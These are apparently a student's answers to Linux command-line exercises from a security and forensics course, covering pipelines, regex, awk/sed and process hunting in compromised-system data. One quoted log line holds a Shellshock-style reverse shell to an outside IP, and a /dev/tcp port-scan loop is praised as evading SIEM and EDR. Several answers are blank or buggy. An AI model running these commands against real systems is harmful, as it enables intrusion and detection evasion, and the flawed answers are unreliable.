# Exercises
## Getting Around 
### 1
How many ways to copy "/etc/passwd" in "tmp"

- cp /etc/passwd /tmp

- cd to /etc, then cp back to absolute /tmp or from /tmp
	- cp ./passwd /tmp 

- cd /tmp
	- cp /etc/passwd ./

- The number of ways could be added to the deepest possible directory in linux
	- cp ../../../.././etc/passwd /tmp
	- How deep can you make a file

- 
### 2
What directory would you be in after you ran the following command:
   "cd ~/Pictures/.././.././../etc/systemd/../../var/log/.././../../../../../.."
- root

### 5
Use the "cd" command to descend as far as possible under "Targets/PtP" in order to discover
   the full text of the "phrase that pays".
- TAB COMPLETION
## Basic Command Syntax
### 1
Under /var/log:
- What is most recently modified files?
	- auth.log
- What file is least recently modified (oldest) file?
	- sysstat
- What is the file size in the largest file?
	- lastlog
- How many megabytes is the largest file?
	- 0.286 MB

### 2
What is the command to make directories? (HINT: Try "man -k")
- mkdir

### 3
You want to make a directory called "/tmp/fee/fie/fo/fum"-- how can you do this with a single command? (HINT: get some experience reading Linux manual pages)

- use -p
### 4
The directory "Targets/Pictures" contains files with .gif, .jpg, .jpeg, and .png extensions.
   Make three directories under ~/Pictures for GIF, JPG, and PNG files and then copy the files
   from "Targets/Pictures" into their appropriate destinations. Note that both the .jpg and .jpeg
   files should end up in ~/Pictures/JPG!
- mkdir GIF JPG PNG
```
┌──(kali㉿kali)-[~/Exercises/Targets/Pictures]
└─$ cp *.gif ./GIF

┌──(kali㉿kali)-[~/Exercises/Targets/Pictures]
└─$ cp *.jpg ./JPG

┌──(kali㉿kali)-[~/Exercises/Targets/Pictures]
└─$ cp *.png ./PNG

```
### 5
Search through your command line history for three commands containing the letters "help".
   What are they?

- mkdir --help
- ls --help | less
- ls --help

### 6
Now become the root user and search root's command history for "help" commands. What are they?

- airbase-ng --help
- bettercap-ui help
- bettercap help

### 7 
Can you find the same commands in your history using string searching in less?

![400](IMG-20231101103846983.png)

## Building Blocks

### 1
List all file names under /usr/include that contain the string "sockaddr_in".
- `ls | grep -lr "sockaddr_in"`
### 2
How many matching files are there?
- 36
### 3 
How many files are in "Targets/Pictures"?
- `ls -lArt ./Pictures | wc -l`
- 992

### 4
"Targets/Pictures" contains files with four different extensions: .gif, .jpeg, .jpg, and .png.
   Run a single command line that tells you how many files there are of each extension. Confirm
   that you have the correct number of files in the directories you made under ~/Pictures in the previous lab section.
```
ls | cut -d. -f2 | sort | uniq -c
```

```
ls --hide '*/' | awk -F. {'print $NF'} | sort | uniq -c
``` 

### 5
"md5sum" computes an MD5 hash on its input. How many unique md5 hashes are there for the files
   in "Targets/Pictures"?



- 
### 6
"ps -ef" lists all of the currently running processes on the system. The first column is the
   user who the process is running as. Count the number of processes for each user and display
   the results in sorted order.

- 
### 7
If you look closely at your output from the previous question you will probably see a line that
   reads "1 UID". This is actually coming from the header of the "ps -ef" output:

        $ ps -ef 
        UID          PID    PPID  C STIME TTY          TIME CMD
        root           1       0  0 Apr16 ?        00:00:20 /usr/lib/systemd/systemd --switched-root ...
        root           2       0  0 Apr16 ?        00:00:01 [kthreadd]
        [...]

   How can you get rid of this unwanted data in your output?


### 8
The file "Targets/ip_addrs" contains IP addresses in random order. Sort the file numerically by the numbers in each octet. Why doesn't a simple "sort -n" work?

```
sort -n -t. -k1,1 -k2,2 -k3,3 -k4,4 Targets/ip_addrs

sort -V ip_addrs | less

```
### 9
Write a pipeline to output the 25th line (and only the 25th line) of a file. You can test your command
   on the file "Targets/numbered_lines". (HINT: maybe "head" and "tail" could help here?)

### 10
"Targets/access_log-hudak" is a web access log from an exploited web server. Often attackers launch exploits
    from a command-line tool like "curl". Output the IPs using any version of curl in sorted order based on the
    number of times the IP address appears in the file. (HINT: since awk uses "/.../" for pattern match, if you
    want to match a literal "/" you need to enter it as "\/")


### 11
The file "Targets/psscan-output" contains output from the Volatility memory forensics "psscan" plugin.
    This plugin is excellent at finding data about processes running (or which ran recently) on the system,
    but it often produces redundant process info because of the way data gets moved and copied around in memory.
    The first column in the output indicates the memory offset where the process structure was found and the
    rest of the line is data about the process. Can you reduce the output to just the lines that are unique
    from the second field onwards, ignoring the memory offset information in column one? (HINT: look at the
    answer to question #5)

Sort allows deduplication based on certain sets of fields.

From fields 2 onward, uniqify the output
```
sort -u -k2 Targets/psscan-output
```
### 12
"Targets/names" contains data on the top 100 most popular male and female names based on data
    from the United States Social Security Administration for the years 1920-2021. Extract the two names
    from each line of data and output an alphabetically sorted file with one name per line.

Helps with wordlist gen for password cracking

```
awk '{print $2"\n"$4}' Targets/names | sort -u >namelist
```

## Output Redirection
### 1
Output a random IP address.
```
echo $(( $RANDOM % 255 )).$(( $RANDOM % 255 )).$(( $RANDOM % 255 )).$(( $RANDOM % 255 ))
```

- with loops
```
for i in {1..4}; do echo -n "$(( $RANDOM % 255 ))."; done; echo $(($RANDOM %255))
```
### 2 
Make something that works like "cp" using only "cat" and output redirection.

```
```

- 
### 3
One of the examples in class was "grep -f <(cut -d: -f3 /etc/passwd | sort | uniq -d) /etc/passwd".
   The part inside parentheses finds the duplicate user ID values in a passwd file. Then we use that
   list of duplicate UIDs as a list of patterns for grep so we can pull out the accounts with matching UID values.
   Turns out this doesn't work as well as you might hope. Try it on "Targets/passwd" and see what you get.


```
```
### 4 
People will tell you that the order in which you specify output redirection doesn't matter, and mostly
   it doesn't. You can usually redirect STDIN before STDERR and vice versa and the same result happens.
   Compare what happens when you "grep -rl LAB /etc >/tmp/output 2>&1" vs "grep -rl LAB /etc 2>&1 >/tmp/output"
   Why is there a difference in the output?


```
```
### 5 
In the previous lab, we extracted IP addresses from "Targets/access_log-hudak" that used "curl" as their
   User Agent. Did any of these IP addresses ever use a User Agent other than curl?


```
grep -f <(awk '/curl\// {print $1}' Targets/access_log-hudak | sort -u) Targets/access_log-hudak |
               awk '!/curl\// {print $1}' | sort | uniq -c | sort -nr

```
## Programming: Loops
### 1
Output a file containing 1000 random IP addresses that you could use for testing.

```
for i in {1..1000}; do
        for j in {1..4};
                do echo -n "$(( $RANDOM % 255 )).";
        done;
        echo $(($RANDOM % 255));
>> made_ips.txt
done;

```
### 2 
One way to look for exploits being launched against your web server is to look for long lines in
   your access_log file. Write a loop which reads "Targets/access_log-champlain" and outputs the
   length of each line, a tab, and then the original line you read from the file. (HINT: "wc -c" is
   good at counting bytes/characters)

```
cat Targets/access_log-champlain | while read line; do
	len=$(echo $line | wc -c)
	echo -e "$len\\t$line"
done
```

Look at HTTP abnormalities

### 3 
Now output only the 10 longest lines from the file. Bonus points if you can identify the exploit
   that was launched.

```
$ cat Targets/access_log-champlain | while read line; do
            len=$(echo $line | wc -c)
            echo -e "$len\\t$line"
        done | sort -n | tail
        [... output not shown ...]
        1760    192.168.210.131 - - [05/Oct/2019:13:01:27 +0200] "POST /jabc/?q=user/password&name%5b%23post_render...
        1779    192.168.210.131 - - [05/Oct/2019:13:01:29 +0200] "POST /jabc/?q=user/password&name%5b%23post_render...

   If you Google for something like "web exploit post_render", you'll probably get some hits for the "Drupalgeddon2"
   exploit (CVE-2018-7600). You could always do further decoding with CyberChef, but we'll look at some command-line
   tools for doing this later in the course.
```

### 4 



### 5 


### 6 


## Conditionals
### 1 
Coin flip simulator
```
[[ $(( $RANDOM % 2 )) -eq 0 ]] && echo heads || echo tails
```

### 2
Depending on how it was compiled, your bash shell may allow you to "echo hello >/dev/tcp/\<host-or-ip>/\<port>"
   which allows you to send data to some \<host-or-ip> on a specific network \<port>. Using your own IP address
   (or "localhost") write a command line to test whether connecting to a specific port succeeds or fails.
   Output either "port open" or "port closed" depending on the outcome.

Linux/Unix built netcat into the shell

Here's one approach and some sample output:

```
        $ echo hello >/dev/tcp/localhost/22 && echo port open || echo port closed
        port open
        $ echo hello >/dev/tcp/localhost/23 && echo port open || echo port closed
        -bash: connect: Connection refused
        -bash: /dev/tcp/localhost/23: Connection refused
        port closed

(echo hello >/dev/tcp/localhost/23) && echo port open || echo port closed
```

PORT SCANNER ESSENTIALLY
### 3 
Now put that into a loop to try ports 1-1024 and output only the open ports. Suppress the error output from
   connecting to closed ports.

Rather than getting rid of the error output from each command inside the loop, it's faster and easier to
   redirect STDERR at the end of the loop:

```
        $ for port in {1..1024}; do
              echo >/dev/tcp/localhost/$port && echo $port/tcp open
          done 2>/dev/null
        22/tcp open
        111/tcp open
        631/tcp open


# optimized
time for port in {1..1024}; do
              echo >/dev/tcp/localhost/$port && echo $port/tcp open
          done 2>/dev/null
```

No exec system calls, so this is really stealthy.  Gets around patterns that typically get detected by SIEM and EDR tools.
### 4 
"Targets/Pictures" contains files from 000.* through 999.*. However, a few files are missing. Can you output
   the names of the missing files?


If you read the "find" manual page you might notice the "-maxdepth" operator:

```
find . -maxdepth 1 -type d

for i in {000...999}; do ls $i.* || echo $i is missing; done
```

   With "-maxdepth 1" we only look at the current directory and output all subdirectories we find ("-type d").

### 5 
"Targets/maillog-oneline.csv" is a sanitized log of some malicious email activity. Output the lines where the
   bad actor messed up and used the attachment name as the subject line of the message.


This is a rare case where we actually want to run "wc -c" on each individual file, so we use
   "find ... -exec" rather than "find ... | xargs":
   
```
	# find /var/log -type f -exec wc -c {} \; | sort -nr | head -20
	25165824 /var/log/journal/5ead3371ad294202a01d3df2b8fa4828/system.journal
	[...]
	916880 /var/log/messages-20220424
	817926 /var/log/messages
	728534 /var/log/messages-20220409
	689637 /var/log/anaconda/syslog
	635334 /var/log/anaconda/packaging.log
	601928 /var/log/dnf.log
```

   One thing we didn't discuss in class, however, is the "-printf" operator. Check this out:

```
find /var/log -type f -printf "%s\t%p\n" | sort -nr | head -20
```

   With "-printf" you can output a wide variety of different information about each file. Here we are using the
   file size in bytes ("%s") and the file name ("%p") output with a tab ("\t") and a newline ("\n"). See the
   manual page for many other parameters that you can output. The "-printf" version is MUCH faster than the
   "-exec wc -c" version because we don't have to run a command to get the size of each file-- "find" just reads
   the info from the file's metadata (inode) just like "ls" does.


## Other Iterators

### 1
The /dev directory contains special device files. Finding regular files under /dev may be an indication
   of a compromise. Write a "find" command to look for regular files under /dev.

```
sudo find /dev -type f
```

### 2
Attackers often use scheduled tasks for persistence. The tricky part is that there are multiple
   scheduled task subsystems on Linux. Search /etc and /var for any files or directories with names
   that contain the keyword "cron".

```
sudo find /etc /var -type d -name "cron" -ls >/dev/null | wc -l
```
### 3
You have intel that attackers are deploying a script with MD5 checksum 9b114325e783b3b25f1918ca7b813bd4
   Search /tmp, /var/tmp, and /dev/shm for any files that match this checksum.


You'll still get permission denied here, so you should usually just jump into sudo su, then run your commands in a root shell, but you can use quotes to still get this working
```
sudo find /tmp /var/tmp /dev/shm -type f -print0 | xargs -0 md5sum | grep "9b114325e783b3b25f1918ca7b813bd4"
```
### 4 
List all subdirectories of the current directory only. DO NOT show subdirectories of subdirectories.
   (HINT: Is there a way to make "find" not look in subdirectories?)

```
find . -maxdepth 1 -type d
```
### 5 
Previously we used "ls -lASh /var/log" to find the largest files in the /var/log directory itself.
   But what about files in the subdirectories? Create a list of the 20 largest files anywhere under
   /var/log. (HINT: "wc -c" will tell you the number of bytes in a file-- maybe there's a way to combine
   that with "find"? Also you are probably going to want to be root when you run this command.)

```
find /var/log -type f -exec wc -c {} \; | sort -nr | head -20
```

```
find /var/log -type f -printf "%s %p\n" | head
```
### 6
We're starting a new project and we want to copy the directory structure of our current project to the
   new project. Here's the tricky part-- we just want to copy the directory layout but we don't want to copy
   any of the files from the existing project. How could we do this? For practice just copy the directory
   structure under /dev (without the /dev part) to /tmp/newdev.

```
find * -type d | (cd /temp/newdev; xargs mkdir)
```

## Regular Expressions
### 1 
Find all files under /usr/share with a .lua extension where .lua can be in any case (".lua", ".LUA", ".Lua", etc)
   (HINT: old fossils like Hal pipe "find" into "grep", but clever hackers always read the manual page)


```
ls -r /usr/share | grep -Ei "\.lua"

find /usr/share -regextype egrep -iregex '.*\.lua$'
```
### 2 
Suppose we just wanted to list the directories that contain .lua files and not all of the individual files?
   (HINT: check out the "dirname" command)

```
find /usr/share -type f | grep -i '\.lua$' | xargs dirname | sort -u

find /usr/share -type f | grep -i '\.lua$' -printf "%h\n" | sort -u

```
### 3  
Syslog style logs in Linux traditionally start with a timestamp like this:

        Apr  7  5:35:04 LAB sshd[12098]: Accepted password for ...
        Apr 22 12:49:41 LAB sshd[103720]: Accepted password for ...

   Write a regular expression to match this timestamp.

```
.* {1,3}\d{1,2}\:\d{2}:\d{2}
```
### 4
The Apache access_log timestamp looks like "[08/Dec/2021:15:58:17 +0000]". Write a regular expression to match.

```
[0-9]{2}\/[A-Za-z]{1,5}\/[0-9]{4}\:[0-9]{2}\:[0-9]{2}\:[0-9]{2} [+-][0-9]{4}
```
### 5 
"Targets/hudak-unalloc.gz" is a compressed file containing the unallocated blocks from the file system of
   a compromised webserver. First use "strings -a" to extract all of the ASCII strings from this data.
   Then use the regular expressions for Syslog and Apache timestamps to search the ASCII strings for old log
   file entries that have gone into unallocated. (HINT: Use "zcat" to uncompress a file on the fly and send
   the uncompressed output to STDOUT)

```
$ zcat Targets/hudak-unalloc.gz | strings -a >/tmp/hudak-strings
        $ egrep '[A-Z][a-z][a-z] +[0-9]+ +[0-9]+:[0-9]{2}:[0-9]{2} ' /tmp/hudak-strings
        [...]
        Dec  2 23:46:02 ApacheWebServer CRON[8178]: (root) CMD (/root/.remove.sh)
        Dec  2 23:47:02 ApacheWebServer CRON[9062]: (root) CMD (/root/.remove.sh)
        Dec  2 23:47:42 ApacheWebServer python3[27371]: 2021-12-02T23:47:42.556826Z INFO ExtHandler ExtHandler Checking...
        $ egrep '\[[0-9]{2}/[A-Z][a-z][a-z]/[0-9]{4}:[0-9]{2}:[0-9]{2}:[0-9]{2} [-+][0-9]{4}\]' /tmp/hudak-strings

   We find lots of old Syslog style logs but no Apache logs in unallocated. You can verify your regex
   against the supplied access_log though:

        $ egrep '\[[0-9]{2}/[A-Z][a-z][a-z]/[0-9]{4}:[0-9]{2}:[0-9]{2}:[0-9]{2} [-+][0-9]{4}\]' Targets/access_log-hudak
        108.248.66.207 - - [06/Oct/2021:19:42:41 +0000] "GET / HTTP/1.1" 200 45
        108.248.66.207 - - [06/Oct/2021:19:42:41 +0000] "GET /favicon.ico HTTP/1.1" 404 196
        108.248.66.207 - - [06/Oct/2021:19:43:32 +0000] "-" 408 -
        [...]

```
### 6 
"Targets/maillog.csv" tracks emails sent by a compromised account to various recipients. However, in the cases
   where there are multiple recipients, the recipient addresses have broken out onto multiple lines. Rewrite the file
   so that each record is a single long line with the recipient names separated by spaces.

- Linux/Unix sucks at multiline records

```
cat Targets/maillog.csv | while read line; do
	[[ $line =~ ^\"2022-04- ]] && echo
	echo -n "$line "
done
echo
```

## AWK, SED, TR

### 1
In an earlier lab we used a shell loop to output lines from "Targets/maillog-oneline.csv" when the subject and
   attachment fields were the same. How could you do this with awk? Which approach do you prefer?

```
awk -F '\n' '$4~$5 {print $1 $2}' Exercises/Targets/maillog.csv

awk -F, '$4==$5' Exercises/Targets/maillog.csv
```

### 2
/proc contains information about every process running on the system. For example, /proc/1 contains information
   about PID 1, the "systemd" process that started all of the other processes on the system. /proc/1/cmdline
   contains the full command line the process was invoked with, but it uses null-terminated strings instead of
   spaces. Use "tr" to convert the nulls to spaces to make the output more readable. (HINT: You can use \\000
   to match the nulls).

```
cat /proc/1/cmdline | tr \\000 ' '; echo
```
### 3
/proc/1/environ contains variables set in the environment of the systemd process, but again uses null-terminated
   strings. Use "tr" to convert the nulls to newlines for readability. (HINT: Use \\n for newline)

```
sudo cat /proc/1/environ | tr \\000 \\n
```

### 4
"Targets/host_ip_info" contains output from the "host" command that looks like:

207.251.16.10.in-addr.arpa domain name pointer server1.srv.mydomain.net.
208.251.16.10.in-addr.arpa domain name pointer server2.srv.mydomain.net.
16.254.16.10.in-addr.arpa domain name pointer www.mydomain.net.
17.254.16.10.in-addr.arpa domain name pointer mydomain.com.

Rewrite it so that it looks like:

10.16.251.207 server1.srv.mydomain.net
10.16.251.208 server2.srv.mydomain.net
10.16.254.16 www.mydomain.net
10.16.254.17 mydomain.com

```
((\d{1,3}\.){3}\d{1,3})\..+ domain name pointer (.+)\.

sed -E 's/([0-9]+).([0-9]+).([0-9]+).([0-9]+).in-addr.arpa domain name pointer/\4.\3.\2.\1/' Targets/host_ip
_info


```
### 5
Ping all the hosts on your local network and report on the ones that are alive. (HINT: "ping" has multi-line
   output that is a pain to parse-- just focus on the lines that indicate success and also contain the target IP)

```
You can ping a single host rapidly as follows:

        $ ping -c 1 -w 1 192.168.10.135
        PING 192.168.10.135 (192.168.10.135) 56(84) bytes of data.
        64 bytes from 192.168.10.135: icmp_seq=1 ttl=64 time=0.634 ms

        --- 192.168.10.135 ping statistics ---
        1 packets transmitted, 1 received, 0% packet loss, time 0ms
        rtt min/avg/max/mdev = 0.634/0.634/0.634/0.000 ms

   "-c 1" says send a single packet, and "-w 1" means wait at most one second for a response. If we see
   the "64 bytes from ..." line, then the "ping" was a success. So we key in on that line:

        $ ping -c 1 -w 1 192.168.10.135 | grep 'bytes from' | sed -E 's/.* bytes from ([^:]*):.*/\1/'
        192.168.10.135

   We match the IP address with "[^:]*" (all the non-colon characters after the "bytes from" text) and
   replace the line with just the IP address.

   Pinging out an entire network just means wrapping the whole thing up in a loop:

        $ for o in {1..254}; do
              ping -c 1 -w 1 192.168.10.$o | grep 'bytes from' | sed -E 's/.* bytes from ([^:]*):.*/\1/'
          done
        192.168.10.2
        192.168.10.132
        192.168.10.135
        [...]

```

### 6
"Targets/access_log-hudak" documents directory traversal attacks originating from the "/cgi-bin" directory.
   So an indicator for the exploit is a path like "/cgi-bin/../". However sometimes the ".." is encoded as
   "%2e%2e" or ".%2e" or "%2e.". Output all IPs that attempted the exploit against this web server and the number
   of attempts for each IP. Sort by the number of attempts.

```
We can use the pattern "(.|%2e)" to represent each character of the "/../". And of course we need to put
    "\/" in order to mean a literal "/" character in awk's pattern matching.

        $ awk '/\/cgi-bin\/(.|%2e)(.|%2e)\// {print $1}' Targets/access_log-hudak | sort | uniq -c | sort -nr
            115 141.135.85.36
             80 116.202.187.77
             69 203.175.13.24
             55 45.146.164.110
             54 62.76.41.46
             50 109.237.96.124
             [...]

```
### 7
Now only output the IPs that successfully performed the exploit. The exploit was successful if the response
   code (field #9) is "200".

```
All we have to do is add a check for '$9 == "200"' in addition to our pattern match from the previous problem:

        $ awk '/\/cgi-bin\/(.|%2e)(.|%2e)\// && $9 == "200" {print $1}' Targets/access_log-hudak |
                                                                           sort | uniq -c | sort -nr
            111 141.135.85.36
             66 116.202.187.77
             55 45.146.164.110
             54 62.76.41.46
             50 109.237.96.124
             45 203.175.13.24
             [...]

```
### 8
In an earlier lab we extracted IPs from "Targets/access_log-hudak" that used "curl" as their User Agent.
    Later we output IPs from that group that also used a different User Agent besides curl.  Now output a list
    of the unique IP/User Agent pairs from the IPs that used both curl and some other User Agent (don't bother
    showing the curl entries). Count the number of times each unique IP/User Agent pairing occurs and sort by
    IP and then by the count.

```
In a previous lab, we got the list of IPs that used curl, then used that as a list of patterns to extract
   all log lines for those IPs. When we just wanted the IPs that also used something other than curl, we fed those
   logs into awk, selected the non-curl lines and output their IPs.

   But in this case we want both IP and User Agent string. The white space in the access_log User Agent field is
   too irregular to rely on awk. So we use "fgrep -v curl/" to suppress the curl lines and then use sed to extract
   just the IP and User Agent. The IP is the first thing on the line and the User Agent is the last quoted field
   on the line. The sed expression ' ,*"([^"]+)"' says "gobble up everything up to the last double quote, followed
   by stuff that's not a double quote (the User Agent string), followed by the final closing double quote".
   We throw away all the junk we matched and just leave the User Agent string.

   After that it's all just counting and sorting. We had to throw a little excitement into the final sort so that
   it would sort on IP address first (field 2) and then count (field 1). Notice that you are allowed to specify
   a reverse sort on a single field.

        $ grep -f <(awk '/curl\// {print $1}' Targets/access_log-hudak | sort -u) Targets/access_log-hudak |
             fgrep -v curl/ | sed -E 's/ .*"([^"]+)"/ \1/' | sort | uniq -c | sort -n -k2,2 -k1,1r
              5 8.214.10.218 -
              4 8.214.10.218 Mozilla/5.0 (compatible;)
              2 18.27.197.252 Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0
              6 45.33.65.249 -
              5 47.90.255.86 -
              4 47.90.255.86 Mozilla/5.0 (compatible;)
              [...]
              1 219.94.246.47 () { :; }; /bin/bash -i >& /dev/tcp/202.61.199.103/15347 0<&1 2>&1

   The last line of output is malicious. The first part is an incorrect function that's supposed to create a
   "fork bomb" that fills up your process table. They got the syntax wrong though. The second part tries to
   set up a reverse shell to 15347/tcp on 202.61.199.103 -- interestingly not the IP that launched the exploit.

```
### 9
"Targets/audit.log" is full of cryptic data like:

        type=DAEMON_ROTATE msg=audit(1646934663.008:889): op=rotate-logs auid=1000 pid=37308 subj=unconfined_u:...

   The timestamp in the log entry is "1646934663"-- it's in "Unix epoch format", which is the number of seconds
   since Jan 1, 1970. The date command can convert this number into a human readable format: "date -d @1646934663".
   A variety of output formats are available. Convert every line of the audit.log file so that it starts with
   a human readable date as follows:

        2022-03-10 12:51:03 type=DAEMON_ROTATE msg=audit(1646934663.008:889): op=rotate-logs auid=1000 pid=37308...

```
Breaking this down into pieces, first we have to extract the Unix epoch timestamp from each line.
   Then we have to use "date" to convert it into a human-readable string. Finally we output everything:
   
        cat Targets/audit.log | while read line; do
            epoch=$(echo $line | sed -E 's/.*audit\(([0-9]+).*/\1/')
            date=$(date -d @$epoch "+%F %T")
            echo $date $line
        done

```

### 10 
In a previous lab we used "head" and "tail" to extract the 25th line of a file. Using the manual pages for
    "awk" and "sed", can you figure out a way to print the 25th line of the file using each of those languages?

```
"awk" tracks the current line number in the variable "NR" ("Number of this Record"). So in "awk" we can do:

        awk 'NR == 25' input.txt

     Here we're taking advantage of the fact that the default action is "print the matching line" ("{print $0}").

     "sed" allows you to prefix a command with either a line number or a range of line numbers. The simplest
     example of this is the answer to our challenge:

        sed -n 25p input.txt

     The "-n" option means to not print every line. "25p" means only print line 25. If you want to print a range
     of lines, then use a comma:

        sed -n 25,27p input.txt

     That would print lines 25-27.

```

## Processes

### 1 
Output a process listing with the following fields: start time, user, PID, PPID, command line

```
ps -eew -o start_time,user,pid,ppid,command
```
### 2
The Linux version of "ps" also has a "--sort" option to specify field(s) to sort the output on.
   Re-run the previous command but sort the output by start time.

```
ps -eew -o start_time,user,pid,ppid,command --sort start_time
```
### 3
Both "lsof -d txt" and "ls -l /proc/[0-9]*/exe" show executable path names for processes.
   Output only the path names in sorted order. Can you spot any suspicious path names?
   (HINT: If you use /proc for this, you'll probably want to be root)

```
ls -l /proc/[0-9]*/exe 2>/dev/null | fgrep -- '->' | sed 's/.* -> //' | sort -u
```
### 4
Can you figure out a way to get a copy of the deleted binaries? Can you identify the deleted binaries?
   (HINT: I copied the binaries from one of the normal system "bin" directories)

```
Turns out you can recover the deleted executables just by using the /proc/<pid>/exe link:

        # ls -l /proc/[0-9]*/exe 2>/dev/null | fgrep /dev/shm/.rk
        lrwxrwxrwx. 1 lab    lab    0 May  1 11:16 /proc/187316/exe -> /dev/shm/.rk/lsof (deleted)
        lrwxrwxrwx. 1 lab    lab    0 May  1 11:16 /proc/187324/exe -> /dev/shm/.rk/xterm (deleted)
        # cp /proc/187316/exe /tmp/lsof-deleted
        # cp /proc/187324/exe /tmp/xterm-deleted

   Now that we have the executables, I'm going to search for system executables that match their
   MD5 checksums:

        # md5sum /tmp/lsof-deleted
        eea6221f048f6e4b9163f038a2f7cd2f  /tmp/lsof-deleted
        # find /bin /usr/bin -type f | xargs md5sum | fgrep eea6221f048f6e4b9163f038a2f7cd2f
        eea6221f048f6e4b9163f038a2f7cd2f  /usr/bin/ncat

        # md5sum /tmp/xterm-deleted
        d033b60584afaabd447671d22b8fc985  /tmp/xterm-deleted
        # find /bin /usr/bin -type f | xargs md5sum | fgrep d033b60584afaabd447671d22b8fc985
        d033b60584afaabd447671d22b8fc985  /usr/bin/cat

   So the program running as "lsof" was actually "ncat" (netcat), and "xterm" was just the "cat" program.
```
### 5
Both "lsof -d cwd" and "ls -l /proc/[0-9]*/cwd" show the current working directory of processes.
   Output only the path names in sorted order. Can you spot any suspicious path names?

```
OK, let's try our luck with "lsof" this time around. The current working directory path is the ninth
   column of "lsof" output.

        # lsof -d cwd | awk '{print $9}' | sort -u
        lsof: WARNING: can't stat() fuse.gvfsd-fuse file system /run/user/1000/gvfs
              Output information may be incomplete.
        /
        /dev/shm/.rk
        /etc/avahi
        /home/lab
        NAME
        /proc
        /var/spool/at

   We're seeing an annoying warning from "lsof"-- you can suppress this with the "-w" option.
   The "NAME" output is from the "lsof" header. We could use "tail -n +2" to skip the header.

        # lsof -w -d cwd | tail -n +2 | awk '{print $9}' | sort -u
        /
        /dev/shm/.rk
        /etc/avahi
        /home/lab
        /proc
        /var/spool/at

   Again /dev/shm/.rk looks suspicious. Some of the other paths might look a little suspicious to you
   as well, but it turns out these are typical for the flavor of Linux I'm running.

```

### 6
"lsof +L1" shows processing using files that have been deleted. Does running this command alert
   you to any more suspicious processes?
   
```
Let's see what "lsof +L1" has to say:

        # lsof -w +L1
        COMMAND      PID    USER   FD   TYPE DEVICE SIZE/OFF NLINK     NODE NAME
        auditd       975    root    4r   REG  253,0  9253600     0 34201374 /var/lib/sss/mc/passwd (deleted)
        auditd       975    root   12r   REG  253,0  6940392     0 34201422 /var/lib/sss/mc/group (deleted)
        udisksd     1012    root   16r   REG  253,0  9253600     0 34201374 /var/lib/sss/mc/passwd (deleted)
        [...]

   Oh my. It appears that there are many processes using deleted files on my system. They can't all be suspicious.
   What if we just focus in on the suspicious "/dev/shm/.rk" directory we have already identified:

        # lsof -w +L1 | fgrep /dev/shm/.rk
        lsof      187316     lab  txt    REG   0,22   439368     0  2859945 /dev/shm/.rk/lsof (deleted)
        xterm     187324     lab  txt    REG   0,22    38568     0  2860332 /dev/shm/.rk/xterm (deleted)
        xterm     187324     lab    0r  FIFO   0,22      0t0     0  2860331 /dev/shm/.rk/data (deleted)
        tail      187325     lab    1w  FIFO   0,22      0t0     0  2860331 /dev/shm/.rk/data (deleted)

   Hmm, three different processes all tied to deleted files under /dev/shm/.rk

```
### 7
Both "netstat -peanut" and "lsof -i" show you information about processes using the network.
   But we would like to see the full path name of the executable for each process using the network.
   How can we output the full executable path names for only processes currently using the network.
   
```
"lsof -i" shows all processes using the network. "lsof -i -t" outputs just their PIDs.

        # for pid in $(lsof -i -t); do
              ls -l /proc/$pid/exe
          done | sed 's/.* -> //' | sort -u
        /dev/shm/.rk/lsof (deleted)
        /dev/shm/.rk/xterm (deleted)
        /usr/bin/gnome-shell
        /usr/bin/rpcbind
        /usr/lib/systemd/systemd
        /usr/sbin/avahi-daemon
        /usr/sbin/chronyd
        /usr/sbin/cupsd
        /usr/sbin/dnsmasq
        /usr/sbin/NetworkManager
        /usr/sbin/sshd

   We loop over the list of PIDs and output "ls -l /proc/$pid/exe". Then we use the same "sed ... | sort -u"
   pipeline we used before. Again our suspicious processes are pretty easy to spot.

```

### 8
 Terminate all suspicious processes using the output of "lsof +L1"

```
Earlier we used "lsof -w +L1 | fgrep /dev/shm/.rk" to get information about our suspicious processes.
   To kill them we can use some clever output substitution:

        # lsof -w +L1 | fgrep /dev/shm/.rk
        lsof      187316     lab  txt    REG   0,22   439368     0  2859945 /dev/shm/.rk/lsof (deleted)
        xterm     187324     lab  txt    REG   0,22    38568     0  2860332 /dev/shm/.rk/xterm (deleted)
        xterm     187324     lab    0r  FIFO   0,22      0t0     0  2860331 /dev/shm/.rk/data (deleted)
        tail      187325     lab    1w  FIFO   0,22      0t0     0  2860331 /dev/shm/.rk/data (deleted)
        # kill -9 $(lsof -w +L1 | fgrep /dev/shm/.rk | awk '{print $2}')
        # lsof -w +L1 | fgrep /dev/shm/.rk

   "awk" peels out the PIDs from field two and then we substitute the list of PIDs as arguments to "kill -9".
   Checking again with "lsof" shows all the processes are dead.
```

## Users, Groups, Perms

- 
# Other 
## Viewing Files & Dirs
- "less \<filename\>" to slowly view files
	- hit q to exit

- Showing files that match regex
	- ls "regex"?
## Copying Between VM and Host OS
- VM to Host
	- Copy Selection

## Misc Shortcuts
- use push d and pop d to maintain a history of places and quickly go back and forward

## Misc Commands
- 